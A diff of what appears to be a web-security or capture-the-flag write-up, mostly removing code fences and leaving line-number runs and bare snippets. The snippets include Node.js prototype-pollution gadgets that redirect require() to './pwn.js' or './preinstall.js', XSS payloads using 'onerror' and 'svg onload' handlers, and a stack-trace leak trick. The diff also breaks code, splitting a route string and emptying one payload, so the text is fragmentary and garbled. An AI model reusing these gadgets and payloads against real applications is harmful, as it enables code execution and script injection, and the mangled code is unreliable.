@@ -28,11 +28,6 @@
 21
 22
 23
-```
-
-
-
-```
 #!/usr/local/bin/node
 process.stdin.setEncoding('utf-8');
 process.stdin.on('readable', () => {
@@ -56,37 +51,12 @@ module.exports=(O,o) => (
  )
  ), o
 );
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 const { 1: name, 2: expansion = '' } =
  RegExpPrototypeExec(EXPORTS_PATTERN, request) || kEmptyObject;
-```
-
-
-
-```
 1
-```
-
-
-
-```
 const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
-```
-
-
-
-```
 1
 2
 3
@@ -96,11 +66,6 @@ const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
 7
 8
 9
-```
-
-
-
-```
 Object.prototype["data"] = {
  exports: {
  ".": "./pwn.js"
@@ -110,11 +75,6 @@ Object.prototype["data"] = {
 Object.prototype["path"] = './'
 
 require('./usage.js')
-```
-
-
-
-```
 1
 2
 3
@@ -130,11 +90,6 @@ require('./usage.js')
 13
 14
 15
-```
-
-
-
-```
 Object.prototype["data"] = {
  exports: {
  ".": "./preinstall.js"
@@ -150,27 +105,12 @@ Object.prototype.env = {
 }
 
 require('./usage.js')
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 var p = new Proxy({flag: window.flag || 'flag'}, {
  get: () => 'nope'
 })
-```
-
-
-
-```
 1
 2
 3
@@ -179,12 +119,8 @@ var p = new Proxy({flag: window.flag || 'flag'}, {
 6
 7
 8
-```
-
-
-
-```
-fastify.get("/api/notes/:noteId", async (request, reply) => {
+fastify.get("/api/notes/:
+noteId", async (request, reply) => {
  const user = new User(request.session.userId);
  if (request.headers["x-token"] !== hash(user.id)) {
  throw new Error("Invalid token");
@@ -192,49 +128,19 @@ fastify.get("/api/notes/:noteId", async (request, reply) => {
  const noteId = validate(request.params.noteId);
  return user.sendNote(reply, noteId);
 });
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
-element.innerHTML = '<img src=x onerror=console.log(1)>'
+element.innerHTML = ''
 console.log(2)
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 const div = document.createElement('div')
 div.innerHTML = '<svg><svg onload=console.log(1)>'
 console.log(2)
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 window.addEventListener('unhandledrejection', e => {
 	console.log(e.reason.stack.match(/\/message\/(\w+)/)[1]);
 });
